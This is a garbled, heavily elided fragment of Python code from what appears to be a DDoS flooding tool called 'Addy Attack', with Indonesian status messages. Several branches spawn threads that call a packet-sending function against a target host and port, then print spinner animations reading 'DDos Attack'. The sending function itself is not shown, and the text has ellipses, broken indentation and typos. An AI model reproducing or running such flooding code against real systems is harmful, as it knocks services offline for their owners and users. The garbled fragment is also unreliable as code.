		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] paket dari Addy Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[\] paket dari Addy Attack..")
					time.sleep(1)
					...
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] paket dari Addy Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] paket dari Addy Attack...")
					time.sleep(1)
			...
			try:
				if running >= 20000:
					...
					main()
						...
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[91m[-] paket dari Addy ,1Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[\] paket dari Addy Attack..")
						time.sleep(1)
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] DDos Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] DDos Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] DDos Attack...")
					time.sleep(1)
